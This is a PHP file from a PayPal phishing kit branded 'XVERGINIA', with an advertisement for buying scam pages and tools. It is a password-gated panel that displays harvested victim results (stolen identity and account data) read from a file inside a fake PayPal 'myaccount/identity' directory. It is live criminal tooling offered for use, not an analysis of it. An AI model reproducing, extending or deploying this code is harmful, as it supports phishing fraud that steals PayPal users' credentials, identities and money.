<?php

include('../ShadowZ118/functions/Config.php');

// PRIV8 PAYPal XVERGINIA V3.1
@session_start();
@set_time_limit(0);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "$XV_PASS";
######ver####
$ver= "v9,999999";
#############
@$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<noembed><xmp><body></xmp></noembed><noembed><xmp></body></html></xmp></noembed><title>-XVERGINIA-V3.1-</title>
<center>
<legend>&#x26A0; ENTER YOUR Admin PASSWORD &#x26A0;</legend>
<font size=1 face=verdana><center>
<b></font></a><br></b>
</center>
<form method=post>
<input type=password name=pass size=28>
</form>
</table>
");}

} 

echo "<head><title>RZLT &#x270C; XVERGINIA-V4.1</title></head>" ;
echo "<p style='color:green;padding-top=10px'><center><h2><stronng>"."THIS BY &#x270C; xXXx.BLVD &#x270C; <a href='https://fb.com/xXXx.BLV' terget='_blank'><em>CONTACT ME</em></a> For buying eny scama & Tools"."</strong></h2></center></p><br>" ;
if ($Save_RZLTS == "yes") 
{	
$xver = file_get_contents (dirname(__FILE__) . "/../ShadowZ118/myaccount/identity/INC/ID.html") ;
echo "$xver" ;
}
else 
{
echo
"<br><br><p><h3> -------- Save RZLTS Mode Disabled -_- Go To Config.php and Change To *yes* ........<h3></p>" ;
}
 	
?>